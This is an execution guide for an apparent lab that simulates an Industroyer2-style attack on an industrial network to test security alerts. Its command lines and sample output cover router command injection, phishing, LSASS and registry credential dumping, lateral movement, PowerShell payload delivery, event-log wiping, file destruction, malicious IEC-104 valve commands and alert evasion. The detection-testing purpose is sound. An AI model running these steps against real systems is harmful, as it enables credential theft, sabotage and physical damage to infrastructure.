# mrhOTshOT Execution Guide

> **Advanced usage and customization options**

This guide covers advanced execution scenarios, customization options, and detailed attack analysis.

## Table of Contents

1. [Quick Reference](#quick-reference)
2. [Attack Modes](#attack-modes)
3. [Individual Phase Execution](#individual-phase-execution)
4. [Customization Options](#customization-options)
5. [Expected Alerts Breakdown](#expected-alerts-breakdown)
6. [Advanced Scenarios](#advanced-scenarios)
7. [Logging and Forensics](#logging-and-forensics)

---

## Quick Reference

### Full Automated Attack
```bash
cd ~/mrhOTshOT/execution
./run_attack.sh
# Select option 1
```

### Interactive Mode (Recommended for First Run)
```bash
cd ~/mrhOTshOT/execution
./run_attack.sh
# Select option 2
```

### Individual Phase Execution
```bash
cd ~/mrhOTshOT/machines/attacker/scripts

# Phase 1: Initial Access
python3 01_router_exploit.py 192.168.0.13 --username admin --password admin --command "whoami"

# Phase 2: Enumeration
python3 02_enumeration.py 192.168.0.13 --username admin --password admin --target-network 192.168.1.0/24

# Phase 3: Credential Dumping (run ON HMI)
python3 05_credential_dumper.py --dump-lsass --dump-registry

# Phase 4: Lateral Movement
python3 03_lateral_movement.py --router-ip 192.168.0.13 --hmi-ip 192.168.1.55 \
    --username operator --password labpass123

# Phase 5: Payload Delivery (all methods)
python3 06_file_transfer_all_methods.py --target 192.168.1.55 \
    --username operator --password labpass123 --file payload.zip --method all

# Phase 6: Industroyer2 Characteristics (run ON HMI)
python3 industroyer2_characteristics.py

# Phase 7: OT Attack (run ON HMI)
python3 industroyer2_simulation.py --target 192.168.1.6 --port 2404
```

---

## Attack Modes

### Mode 1: Full Automated

**Use Case**: Demonstrations, regression testing, generating maximum alerts

**Command**:
```bash
python3 MASTER_ATTACK_ORCHESTRATOR.py --auto-yes
```

**Behavior**:
- Executes all 7 phases sequentially
- No user interaction required
- Continues even if individual phases fail
- Generates comprehensive logs

**Duration**: 15-30 minutes (depending on network)

**Expected Output**:
```
[PHASE 1/7] Initial Access - Router Exploitation
[!!!] SUCCESS: Router compromised
[PHASE 2/7] Post-Exploitation Enumeration
[*] Discovered target: 192.168.1.55 (HMI)
[PHASE 3/7] Credential Access
[!!!] LSASS dump successful
[PHASE 4/7] Lateral Movement to HMI
[!!!] Lateral movement successful
[PHASE 5/7] Payload Delivery (4 Methods)
[!!!] All 4 transfer methods successful
[PHASE 6/7] Industroyer2 Characteristics
[!!!] Process termination complete
[!!!] Event log deletion successful
[PHASE 7/7] OT Attack Execution
[!!!] IEC-104 attack successful - Water tank overflow
[SUCCESS] Full attack chain completed
```

---

### Mode 2: Interactive

**Use Case**: Training, understanding each phase, controlled demonstrations

**Command**:
```bash
python3 MASTER_ATTACK_ORCHESTRATOR.py
```

**Behavior**:
- Prompts for confirmation before each phase
- Shows detailed phase information
- Allows skipping phases
- Allows stopping at any point

**Example Interaction**:
```
[PHASE 1/7] Initial Access - Router Exploitation

This phase will:
  - Exploit command injection in vulnerable router web server
  - Alternative: Launch phishing server for credential capture
  - MITRE ATT&CK: T1190 (Exploit Public-Facing Application)

Continue with Phase 1? [y/N]: y
```

---

### Mode 3: Manual Phase Selection

**Use Case**: Testing specific attack vectors, debugging, customization

**Command**:
```bash
python3 MASTER_ATTACK_ORCHESTRATOR.py --phases 1,2,5
```

**Options**:
- `--phases 1,2,5` - Execute only phases 1, 2, and 5
- `--skip-phases 3,4` - Execute all except phases 3 and 4
- `--start-from 4` - Start from phase 4, skip earlier phases

**Examples**:
```bash
# Test only initial access and enumeration
python3 MASTER_ATTACK_ORCHESTRATOR.py --phases 1,2

# Skip credential dumping, test rest of chain
python3 MASTER_ATTACK_ORCHESTRATOR.py --skip-phases 3

# Resume from lateral movement (assumes phases 1-3 already done)
python3 MASTER_ATTACK_ORCHESTRATOR.py --start-from 4
```

---

## Individual Phase Execution

### Phase 1: Initial Access

#### Option A: Router Exploit (Default)
```bash
python3 01_router_exploit.py 192.168.0.13 \
    --username admin \
    --password admin \
    --command "whoami"
```

**What it does**:
- Exploits command injection in router web server (port 8080)
- Executes arbitrary commands on router
- Establishes initial foothold in IT network

**Expected Alerts**:
- Device Security: Command Injection (CVE-like signature)
- XSIAM: Suspicious HTTP POST to /execute endpoint

#### Option B: Phishing (Alternative)
```bash
python3 00_phishing_server.py --port 8000 --domain fake-login.com
```

**What it does**:
- Starts phishing server on attacker machine
- Captures credentials when victim enters them
- Saves to `captured_credentials.txt`

**Expected Alerts**:
- XSIAM: Connection to suspicious domain
- WildFire: Phishing page submission

---

### Phase 2: Enumeration

```bash
python3 02_enumeration.py 192.168.0.13 \
    --username admin \
    --password admin \
    --target-network 192.168.1.0/24
```

**What it does**:
- SSH to compromised router
- Execute nmap FROM router to scan OT network
- Discover HMI, PLC, Historian
- Identify open ports: 445 (SMB), 3389 (RDP), 5985 (WinRM), 2404 (IEC-104)

**Expected Alerts**:
- Device Security: Port Scanning from router to OT network
- XSIAM: Unusual nmap execution on router

**Output**:
```
[*] SSH to router successful
[*] Executing nmap from router...
[*] Discovered hosts:
    - 192.168.1.55 (HMI) - Ports: 445, 3389, 5985
    - 192.168.1.6 (PLC) - Ports: 2404
```

---

### Phase 3: Credential Dumping

**IMPORTANT**: This phase must run ON the HMI (not from attacker)

```bash
# Transfer script to HMI first
scp 05_credential_dumper.py operator@192.168.1.55:C:\\Temp\\

# Then execute on HMI via RDP or WinRM
python3 05_credential_dumper.py --dump-lsass --dump-registry --output C:\\Temp\\creds
```

**What it does**:
- Dumps LSASS memory using `rundll32.exe comsvcs.dll MiniDump`
- Dumps registry hives: SAM, SECURITY, SYSTEM using `reg.exe save`
- Attempts credential extraction with pypykatz

**Expected Alerts** (30-50 alerts on Cortex XDR):
- LSASS Memory Access (HIGH severity)
- Registry Hive Dump - SAM
- Registry Hive Dump - SECURITY
- Registry Hive Dump - SYSTEM
- Credential Dumping Tool Execution
- Suspicious rundll32.exe usage
- Pypykatz execution (if installed on HMI)

**Output**:
```
[*] Dumping LSASS memory...
[!!!] SUCCESS: LSASS dump created (152 MB)
[*] Dumping registry hives...
[!!!] SUCCESS: SAM hive dumped (1.2 MB)
[!!!] SUCCESS: SECURITY hive dumped (512 KB)
[!!!] SUCCESS: SYSTEM hive dumped (15 MB)
[*] Attempting credential extraction...
[!!!] Extracted 12 credential entries
```

---

### Phase 4: Lateral Movement

```bash
python3 03_lateral_movement.py \
    --router-ip 192.168.0.13 \
    --hmi-ip 192.168.1.55 \
    --username operator \
    --password labpass123
```

**What it does**:
- Pivots from IT network (via router) to OT network
- Tests connectivity to HMI
- Establishes SMB connection
- Verifies WinRM access
- Creates staging directory on HMI

**Expected Alerts**:
- Device Security: IT-to-OT boundary crossing (CRITICAL)
- XSIAM: Unusual SMB connection from router to HMI
- Cortex XDR: Remote authentication from unusual source

**Output**:
```
[*] Testing route from 192.168.0.13 to 192.168.1.55...
[!!!] Route confirmed - IP forwarding enabled
[*] Testing SMB connection...
[!!!] SMB access successful
[*] Testing WinRM...
[!!!] WinRM access confirmed
[*] Created staging directory: C:\Temp\industroyer2_payload
```

---

### Phase 5: Payload Delivery

#### Transfer All Methods
```bash
python3 06_file_transfer_all_methods.py \
    --target 192.168.1.55 \
    --username operator \
    --password labpass123 \
    --file payload.zip \
    --method all
```

#### Individual Transfer Methods

**Method 1: SMB**
```bash
python3 06_file_transfer_all_methods.py \
    --target 192.168.1.55 \
    --username operator \
    --password labpass123 \
    --file industroyer2_characteristics.py \
    --method smb
```

**Expected Alert**: SMB file transfer from external host

**Method 2: HTTP**
```bash
python3 06_file_transfer_all_methods.py \
    --target 192.168.1.55 \
    --username operator \
    --password labpass123 \
    --file industroyer2_simulation.py \
    --method http
```

**Expected Alerts**:
- Temporary Python HTTP server on attacker
- PowerShell download from external IP
- WildFire submission of downloaded file

**Method 3: PowerShell In-Memory**
```bash
python3 06_file_transfer_all_methods.py \
    --target 192.168.1.55 \
    --username operator \
    --password labpass123 \
    --file 05_credential_dumper.py \
    --method powershell
```

**Expected Alerts**:
- Base64 encoded PowerShell execution
- Suspicious PowerShell command line
- Memory-only execution (no file on disk initially)

**Method 4: RDP Drive Redirection**
```bash
python3 06_file_transfer_all_methods.py \
    --target 192.168.1.55 \
    --username operator \
    --password labpass123 \
    --file PsExec.exe \
    --method rdp
```

**Expected Alerts**:
- RDP connection from unusual source
- Drive redirection enabled
- File copy from \\tsclient\share
- LOLBin (PsExec.exe) download

---

### Phase 6: Industroyer2 Characteristics

**IMPORTANT**: This phase must run ON the HMI

```bash
# Execute on HMI
python3 industroyer2_characteristics.py
```

**What it does**:
1. **Process Termination** (T1489):
   - Terminates SCADA/HMI processes
   - Kills monitoring tools
   - Stops protective services

2. **Event Log Deletion** (T1070.001):
   - Clears Security log
   - Clears System log
   - Clears Application log

3. **File Destruction** (T1485 - CaddyWiper):
   - Overwrites files with random data
   - Deletes system files
   - Destroys recovery information

**Expected Alerts** (15-25 alerts on Cortex XDR):
- SCADA Process Termination (CRITICAL)
- Event Log Cleared (Security) - CRITICAL
- Event Log Cleared (System) - CRITICAL
- Event Log Cleared (Application) - HIGH
- Mass File Deletion
- Anti-Forensics Activity
- CaddyWiper Behavior

**Output**:
```
[*] Phase 6: Industroyer2 Characteristics
[!!!] Terminated 8 processes
[!!!] Cleared Security event log (12,543 events)
[!!!] Cleared System event log (8,234 events)
[!!!] Cleared Application event log (3,456 events)
[!!!] Destroyed 145 files (CaddyWiper simulation)
```

---

### Phase 7: OT Attack

**IMPORTANT**: This phase runs ON the HMI, targets the PLC

```bash
# Execute on HMI
python3 industroyer2_simulation.py --target 192.168.1.6 --port 2404
```

**What it does**:
1. Connect to PLC via IEC-104 (port 2404)
2. Read current water tank state
3. Send malicious commands:
   - Open inlet valve (IOA 101)
   - Close outlet valve (IOA 102)
4. Monitor tank level
5. Cause overflow and explosion

**Expected Alerts**:
- Device Security: IEC-104 anomaly detection
- Device Security: Unusual IEC-104 command sequence
- XSIAM: HMI-to-PLC communication anomaly
- XSIAM: Water tank overflow detected (if integrated)

**Output**:
```
[*] Connecting to PLC at 192.168.1.6:2404...
[!!!] IEC-104 connection established
[*] Current water level: 45%
[!!!] Sending malicious command: OPEN inlet valve (IOA 101)
[!!!] Sending malicious command: CLOSE outlet valve (IOA 102)
[*] Water level: 67%... 89%... 95%... 100%... OVERFLOW!
[!!!] CRITICAL: Water tank explosion simulated
[!!!] OT attack successful
```

---

## Customization Options

### MASTER_ATTACK_ORCHESTRATOR.py Options

```bash
python3 MASTER_ATTACK_ORCHESTRATOR.py --help
```

**Available Options**:

| Option | Description | Example |
|--------|-------------|---------|
| `--auto-yes` | Skip all prompts, full auto | `--auto-yes` |
| `--use-phishing` | Use phishing instead of router exploit | `--use-phishing` |
| `--router-ip` | Override router IP | `--router-ip 10.0.0.1` |
| `--hmi-ip` | Override HMI IP | `--hmi-ip 172.16.1.10` |
| `--plc-ip` | Override PLC IP | `--plc-ip 172.16.1.20` |
| `--router-user` | Router username | `--router-user admin` |
| `--router-pass` | Router password | `--router-pass secret` |
| `--hmi-user` | HMI username | `--hmi-user operator` |
| `--hmi-pass` | HMI password | `--hmi-pass P@ssw0rd` |
| `--phases` | Execute specific phases | `--phases 1,2,5` |
| `--skip-phases` | Skip specific phases | `--skip-phases 3,4` |
| `--start-from` | Start from phase N | `--start-from 4` |
| `--log-level` | Logging verbosity | `--log-level DEBUG` |
| `--output-dir` | Log output directory | `--output-dir /tmp/logs` |

**Examples**:

```bash
# Custom IP addresses
python3 MASTER_ATTACK_ORCHESTRATOR.py \
    --router-ip 10.10.0.1 \
    --hmi-ip 10.20.1.100 \
    --plc-ip 10.20.1.50

# Use phishing for initial access
python3 MASTER_ATTACK_ORCHESTRATOR.py --use-phishing

# Test only file transfer methods
python3 MASTER_ATTACK_ORCHESTRATOR.py --phases 5

# Full attack with custom credentials
python3 MASTER_ATTACK_ORCHESTRATOR.py \
    --auto-yes \
    --hmi-user administrator \
    --hmi-pass MyP@ssw0rd123
```

---

## Expected Alerts Breakdown

### XSIAM Attack Chain Correlation

**Expected Incident**: "Industroyer2 Attack Chain Detection"

**Correlated Events**: 75-150 events

**Attack Chain Stages Detected**:
1. Initial Compromise - Router exploitation OR phishing
2. Discovery - Network reconnaissance
3. Credential Access - LSASS/registry dumps
4. Lateral Movement - IT-to-OT boundary crossing
5. Execution - Payload delivery and execution
6. Defense Evasion - Event log clearing
7. Impact - OT device manipulation

**XSIAM Query Example**:
```
dataset = xdr_data
| filter action_local_ip = "192.168.0.11"
| filter action_remote_ip in ("192.168.0.13", "192.168.1.55", "192.168.1.6")
| comp count() by actor_process_image_name, action_external_hostname
| sort desc count
```

---

### Cortex XDR Alerts (Expected: 30-50)

**High Severity**:
- LSASS Memory Access (Credential Dumping)
- Registry Hive Dump - SAM
- Registry Hive Dump - SECURITY
- Registry Hive Dump - SYSTEM
- Event Log Cleared (Security)
- Event Log Cleared (System)
- SCADA Process Termination

**Medium Severity**:
- Suspicious PowerShell Execution
- Base64 Encoded PowerShell Command
- Remote File Copy (SMB)
- WinRM Execution from External Host
- Unusual Network Connection (IT to OT)

**Low/Info**:
- RDP Login from Unusual Source
- HTTP Server Started on Non-Standard Port
- Process Created by Remote User

---

### Device Security Alerts (Expected: 15-25)

**Critical**:
- IT-to-OT Boundary Crossing
- IEC-104 Protocol Anomaly
- Command Injection Attempt (Router)

**High**:
- Port Scanning Activity
- SMB Transfer to OT Network
- Unusual IEC-104 Command Sequence

**Medium**:
- Suspicious HTTP POST Request
- Multiple Authentication Attempts
- Non-Standard Protocol Usage

---

### WildFire Submissions (Expected: 8-15 files)

**Files Submitted**:
- `PsExec.exe` - Microsoft Sysinternals (benign but LOLBin)
- `payload.zip` - Malicious archive
- `industroyer2_characteristics.py` - Malware script
- `industroyer2_simulation.py` - OT attack script
- `05_credential_dumper.py` - Credential theft tool
- `lsass_*.dmp` - Memory dump file
- PowerShell download cradles (in-memory)

**Expected Verdicts**:
- PsExec.exe: Grayware (LOLBin)
- Python scripts: Malware (custom signatures)
- LSASS dumps: Malware (credential dumping)
- payload.zip: Malware (multi-file archive)

---

## Advanced Scenarios

### Scenario 1: Stealth Mode

**Goal**: Minimize alerts while still executing attack

```bash
# Use delayed execution between phases
python3 MASTER_ATTACK_ORCHESTRATOR.py --delay 300
# Wait 5 minutes between each phase

# Use alternative transfer methods
python3 06_file_transfer_all_methods.py --method powershell
# In-memory transfer avoids file-based detection initially
```

### Scenario 2: Maximum Alert Generation

**Goal**: Generate as many alerts as possible for testing

```bash
# Execute all transfer methods
python3 MASTER_ATTACK_ORCHESTRATOR.py --auto-yes

# Then manually execute variations
python3 06_file_transfer_all_methods.py --method smb
python3 06_file_transfer_all_methods.py --method http
python3 06_file_transfer_all_methods.py --method powershell
python3 06_file_transfer_all_methods.py --method rdp
```

### Scenario 3: Persistence Testing

**Goal**: Test detection of persistence mechanisms

```bash
# Add scheduled task creation
python3 03_lateral_movement.py --add-persistence

# Creates scheduled task on HMI to run payload daily
```

### Scenario 4: Multi-Stage Attack

**Goal**: Simulate real-world attack over days

**Day 1**: Initial compromise only
```bash
python3 MASTER_ATTACK_ORCHESTRATOR.py --phases 1,2
```

**Day 2**: Credential theft (24 hours later)
```bash
python3 MASTER_ATTACK_ORCHESTRATOR.py --phases 3
```

**Day 3**: Lateral movement and payload delivery
```bash
python3 MASTER_ATTACK_ORCHESTRATOR.py --phases 4,5
```

**Day 4**: Execute final impact
```bash
python3 MASTER_ATTACK_ORCHESTRATOR.py --phases 6,7
```

---

## Logging and Forensics

### Log Locations

**Attacker Machine**:
- Main orchestrator log: `attack_orchestrator_YYYYMMDD_HHMMSS.log`
- JSON attack timeline: `attack_log_YYYYMMDD_HHMMSS.json`
- Individual phase logs: `phase_N_*.log`

**HMI Machine**:
- Payload execution logs: `C:\Temp\industroyer2_payload\execution.log`
- Credential dumps: `C:\Temp\creds\`
- Event logs (before clearing): Exported to `C:\Logs\mrhOTshOT\`

**PLC Machine**:
- IEC-104 server log: `/var/log/water-tank/iec104_server.log`
- Water tank state log: `/var/log/water-tank/tank_state.log`

**Router Machine**:
- Web server access log: `/var/log/vulnerable-router/access.log`
- SSH authentication log: `/var/log/auth.log`

### Log Analysis

**Parse attack timeline**:
```bash
cd ~/mrhOTshOT/machines/attacker/scripts
cat attack_log_*.json | jq '.phases[] | {phase, status, duration}'
```

**Extract MITRE TTPs**:
```bash
cat attack_log_*.json | jq '.phases[].mitre_ttps[]' | sort | uniq
```

**Count alerts by severity**:
```bash
grep -r "CRITICAL\|HIGH\|MEDIUM\|LOW" attack_orchestrator_*.log | \
    cut -d: -f3 | sort | uniq -c
```

### Forensic Artifacts

**On HMI, look for**:
- `C:\Temp\payload.zip` - Payload archive
- `C:\Temp\PsExec.exe` - LOLBin transfer
- `C:\Temp\creds\lsass_*.dmp` - Memory dumps
- `C:\Temp\creds\SAM` - Registry hive
- Windows Event Logs (before clearing)
- PowerShell history: `C:\Users\operator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

**On Router, look for**:
- `/tmp/` - Temporary files from command injection
- `/var/log/vulnerable-router/` - Access logs showing exploitation
- SSH logs in `/var/log/auth.log`

**On PLC, look for**:
- `/var/log/water-tank/` - IEC-104 traffic logs
- Tank state changes indicating malicious commands

---

## Performance Tuning

### Speed Up Execution

```bash
# Reduce timeouts
python3 MASTER_ATTACK_ORCHESTRATOR.py --timeout 30

# Skip verification steps
python3 MASTER_ATTACK_ORCHESTRATOR.py --skip-verification

# Parallel file transfers
python3 06_file_transfer_all_methods.py --parallel
```

### Slow Down for Analysis

```bash
# Add delay between phases
python3 MASTER_ATTACK_ORCHESTRATOR.py --delay 60

# Verbose logging
python3 MASTER_ATTACK_ORCHESTRATOR.py --log-level DEBUG

# Pause after each phase
python3 MASTER_ATTACK_ORCHESTRATOR.py # (interactive mode)
```

---

## Troubleshooting Execution

### Attack Fails at Phase 1

**Symptoms**: Cannot exploit router

**Check**:
```bash
curl http://192.168.0.13:8080
# Should return HTML

curl -X POST http://192.168.0.13:8080/execute -d "command=whoami"
# Should execute command
```

### Attack Fails at Phase 3

**Symptoms**: Credential dumping fails

**Common Issues**:
- Script not running with admin privileges on HMI
- Antivirus blocking rundll32.exe or reg.exe
- Insufficient disk space for dump files

**Solution**:
```powershell
# On HMI, run PowerShell as Administrator
python C:\Temp\05_credential_dumper.py --dump-lsass --dump-registry
```

### Attack Fails at Phase 5

**Symptoms**: File transfer fails

**Check connectivity**:
```bash
# Test SMB
smbclient -L //192.168.1.55 -U operator%labpass123

# Test WinRM
impacket-wmiexec operator:labpass123@192.168.1.55 "whoami"
```

### Attack Fails at Phase 7

**Symptoms**: Cannot connect to PLC

**Check**:
```bash
# Test IEC-104 port
telnet 192.168.1.6 2404

# Verify PLC server is running
ssh user@192.168.1.6 "netstat -ln | grep 2404"
```

---

## Safety and Cleanup

### Stop Attack Mid-Execution

```bash
# Press Ctrl+C in terminal running orchestrator
# Then kill any remaining processes:

pkill -f phishing_server
pkill -f vulnerable_router
pkill -f iec104_server
```

### Clean Up After Attack

**On Attacker**:
```bash
rm -f attack_orchestrator_*.log
rm -f attack_log_*.json
rm -f payload.zip
rm -f PsExec.exe
rm -f captured_credentials.txt
```

**On HMI**:
```powershell
Remove-Item C:\Temp\* -Recurse -Force
Remove-Item C:\Logs\mrhOTshOT\* -Recurse -Force
```

**On PLC**:
```bash
sudo systemctl restart water-tank
```

**On Router**:
```bash
sudo systemctl restart vulnerable-router
```

### Reset Environment

```bash
# On all machines
cd ~/mrhOTshOT/execution
./reset_environment.sh
```

---

## Next Steps

After successful execution:

1. Review XSIAM for attack chain correlation
2. Analyze Cortex XDR alerts
3. Check Device Security threat logs
4. Review WildFire submissions
5. Extract IOCs for threat hunting
6. Create custom detection rules based on findings

---

**Need help?** → [TROUBLESHOOTING.md](TROUBLESHOOTING.md)

**Understanding the network?** → [NETWORK_TOPOLOGY.md](../NETWORK_TOPOLOGY.md)

**Setting up from scratch?** → [SETUP_GUIDE.md](SETUP_GUIDE.md)
